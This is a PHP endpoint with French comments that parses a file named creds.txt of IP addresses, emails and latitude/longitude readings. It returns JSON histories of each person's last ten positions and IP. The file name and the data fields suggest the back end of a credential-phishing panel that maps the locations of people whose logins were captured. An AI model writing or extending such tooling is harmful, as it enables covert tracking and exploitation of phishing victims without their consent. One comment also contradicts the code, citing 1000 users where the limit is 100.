<?php
header('Content-Type: application/json');
date_default_timezone_set('Africa/Bujumbura');
$creds_file = 'creds.txt';

$positions = [];
if (file_exists($creds_file)) {
    $logs = file_get_contents($creds_file);
    $entries = explode("\n", $logs);
    $user_history = []; // {email: [[lat,lng,time,ip], ...]}
    
    // Parse LIGNE PAR LIGNE récent → ancien
    foreach (array_reverse($entries) as $line) {
        if (preg_match('/^(\S+)\|([^|]+)\|([^|]+)\|.+?\|([-+]?\d+\.\d+)\|([-+]?\d+)\|(.*)$/', $line, $match)) {
            $ip = $match[1];
            $email = trim($match[2]);
            $lat = floatval($match[4]);
            $lng = floatval($match[5]);
            $timestamp = trim($match[6]);
            
            if ($email && strlen($email) > 3) { // Valid email
                if (!isset($user_history[$email])) $user_history[$email] = [];
                $user_history[$email][] = [$lat, $lng, date('H:i:s', strtotime($timestamp ?? 'now')), $ip];
                
                // EXACT 10 positions max
                if (count($user_history[$email]) > 10) {
                    array_pop($user_history[$email]); // Plus ancienne
                }
            }
        }
        // Perf: stop après 1000 users
        if (count($user_history) > 100) break;
    }
    
    // Format JSON final
    foreach ($user_history as $email => $history) {
        $latest = end($history);
        $positions[] = [
            'id' => $email,
            'positions' => array_reverse($history), // Chrono ordre
            'latest' => $latest,
            'count' => count($history),
            'ip' => $latest[3]
        ];
    }
}

echo json_encode($positions, JSON_PRETTY_PRINT);
?>
